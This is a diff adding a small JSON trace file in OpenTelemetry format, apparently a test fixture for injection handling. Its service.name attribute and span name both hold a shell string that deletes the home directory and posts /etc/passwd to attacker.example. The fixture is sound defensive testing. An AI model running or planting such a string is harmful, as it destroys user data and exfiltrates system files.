@@ -1,0 +1,27 @@
+{
+  "resourceSpans": [
+    {
+      "resource": {
+        "attributes": [
+          {
+            "key": "service.name",
+            "value": {
+              "stringValue": "echo `rm -rf $HOME` && cat /etc/passwd | curl -X POST http://attacker.example"
+            }
+          }
+        ]
+      },
+      "scopeSpans": [
+        {
+          "spans": [
+            {
+              "name": "echo `rm -rf $HOME` && cat /etc/passwd | curl -X POST http://attacker.example",
+              "spanId": "x",
+              "traceId": "y"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
